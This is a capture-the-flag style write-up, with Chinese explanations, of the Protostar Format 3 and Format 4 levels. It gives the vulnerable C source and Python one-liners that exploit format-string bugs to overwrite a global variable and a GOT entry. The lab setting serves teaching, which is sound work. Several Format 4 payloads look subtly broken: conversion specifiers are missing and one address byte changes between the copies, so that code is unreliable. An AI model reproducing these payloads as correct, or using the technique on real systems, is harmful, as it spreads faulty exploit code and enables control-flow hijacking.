# Protostar: Format 3

This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.

This level is at `/opt/protostar/bin/format3`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
    printf(string);
}

void vuln()
{
    char buffer[512];

    fgets(buffer, sizeof(buffer), stdin);

    printbuffer(buffer);

    if(target == 0x01025544) {
        printf("you have modified the target :)\n");
    } else {
        printf("target is %08x :(\n", target);
    }
}

int main(int argc, char **argv)
{
    vuln();
}
```



## 攻击目标

使程序输出：`you have modified the target :)`。



## 攻击过程

```shell
$ python -c 'print "\xf4\x96\x04\x08" + "%08x" * 10 + "%16930032x" + "%08n"' | ./format3
```

<img src=".\format3-result.png" style="zoom: 67%;" />



## 原理分析

### 解法一：与format2相同

查看`vuln()`和`printbuffer()`的汇编代码：

<img src=".\format3-disas-1.png" style="zoom:67%;" />

<img src=".\format3-disas-2.png" style="zoom:67%;" />

<img src=".\format3-disas-3.png" style="zoom:67%;" />

程序在运行时的的栈空间如图所示：

<img src=".\format2-analysis-1.png" style="zoom:67%;" />

我们要计算出从`*string`到`buffer`的偏移。

```shell
$ objdump -t format3 | grep target # 查看target的地址
```

<img src=".\format3-analysis-5.png" style="zoom:67%;" />

```shell
$ python -c 'print "DDDD" + "%08x." * 15' | ./format3 # 算出偏移为11DWORD（%08x：读取一个DWORD，以8位16进制数的形式输出，不足位的用0补齐）
```

<img src=".\format3-analysis-6.png" style="zoom:67%;" />

```shell
$ python -c 'print "\xf4\x96\x04\x08" + "%08x" * 11 + "%08n"' | ./format3 # 找到target的位置写入
target is 5c
```

`target is 5c`说明已经将字符串长度写到了target的位置。

<img src=".\format3-analysis-7.png" style="zoom:67%;" />

```shell
$ python -c 'print "\xf4\x96\x04\x08" + "%08x" * 10 + "%16930032x" + "%08n"' | ./format3 # 在%08n前拼凑长为0x01025544-0x5c = 16930116 - 84 = 16930032的字符串（%16930032x：读取一个DWORD，以16930032位16进制数的形式输出，不足位的用空格补齐）
```

<img src=".\format3-result.png" style="zoom:67%;" />



### 解法二：控制`printf()`参数指针

我们也可以将要写入的值分段写入。如下图所示，分成了三段：

<img src=".\format3-analysis-1.png" style="zoom:67%;" />

所以，我们需要构造分段统计长度的格式化字符串：

<img src=".\format3-analysis-2.png" style="zoom:67%;" />

在`printf()`的参数中，有一个特殊的指针，可以指向`*string`指针下的每一个DWORD，我们已经在解法一中得到偏移量为11个DWORD，所以可以轻松得到我们需要写入的地址的指针：

<img src=".\format3-analysis-3.png" style="zoom:67%;" />

综上所述我们可以构造出格式化字符串：

```shell
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08" + "%56x%12$n" + "%17x%13$n" + "%173x%14$n"' | ./format3
```

<img src=".\format3-analysis-8.png" style="zoom:67%;" />



### 解法三：SCUT paper

思路类似于解法二，但关键在于每个%n前的偏移量的计算，算法来源于论文《Exploiting Format String Vulnerabilities》。

<img src=".\format3-analysis-4.png" style="zoom:67%;" />

据此可构造格式化字符串：

```shell
$ python -c 'print "DDDD" + "\xf4\x96\x04\x08" + "DDDD" + "\xf5\x96\x04\x08" + "DDDD" + "\xf6\x96\x04\x08" + "DDDD" + "\xf7\x96\x04\x08" + "%x." * 11 + "%220u%n" + "%17u%n" + "%173u%n" + "%255u%n"' | ./format3
```

<img src=".\format3-analysis-9.png" style="zoom:67%;" />



<div STYLE="page-break-after: always;"></div>

# Protostar: Format 4

format4 looks at one method of redirecting execution in a process.

> **Hints:**
>
> - objdump -TR is your friend

This level is at `/opt/protostar/bin/format4`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
    printf("code execution redirected! you win\n");
    _exit(1);
}

void vuln()
{
    char buffer[512];

    fgets(buffer, sizeof(buffer), stdin);

    printf(buffer);

    exit(1);  
}

int main(int argc, char **argv)
{
    vuln();
}
```



## 攻击目标

使程序输出：`code execution redirected! you win`。



## 攻击过程

```shell
python -c 'print "\x24\x97\x04\x08" + "\x25\x97\x04\x08" + "\x27\x97\x04\x08" + "%168x%4$n" + "%976%5$n" + "%132%6$n"' | ./format4
```

<img src=".\format4-result.png" style="zoom:67%;" />



## 原理分析

如果程序正常运行，`hello()`不会被调用。

```shell
(gdb) p hello # hello()的入口地址0x080484b4
```

<img src=".\format4-analysis-3.png" style="zoom:67%;" />

所以，我们要利用代码中的`printf()`，将`hello()`的入口地址覆写到存储着`exit()`的入口地址的位置上，如图。

<img src=".\format4-analysis-1.png" style="zoom:67%;" />

`exit()`是c标准库中的一个函数，c标准库以动态链接库的形式装载进我们的程序中。一般一个程序要调用动态链接库中的函数，它会维护两个表，PLT和GOT——PLT内存储的是一些短小的代码，用于协助主函数进行跳转；GOT里存储的是跳转要去往的目标地址。所以我们要找到GOT中`exit()`的跳转地址，将其中存储的`exit()`的入口地址覆写为`hello()`的入口地址。

```shell
$ objdump -TR format4 # exit()的跳转地址为0x08049724
```

<img src=".\format4-analysis-4.png" style="zoom:67%;" />

```shell
$ python -c 'print "DDDD" + "%08x." * 5' | ./format4 # 计算偏移值，为3DWORD，所以参数指针为4$。
```

<img src=".\format4-analysis-5.png" style="zoom:67%;" />

因为0x080484b4视作一个数的时候较大，所以我们采用分段写入的方式。为了让分段写入的数字递增，可以进行拼凑和补充，如下图所示：

<img src=".\format4-analysis-2.png" style="zoom:67%;" />

综上所诉，可以构造格式化字符串：

```shell
python -c 'print "\x24\x97\x04\x08" + "\x25\x97\x04\x08" + "\x27\x97\x04\x07" + "%168x%4$n" + "%976%5$n" + "%132%6$n"' | ./format4
```

<img src=".\format4-result.png" style="zoom:67%;" />
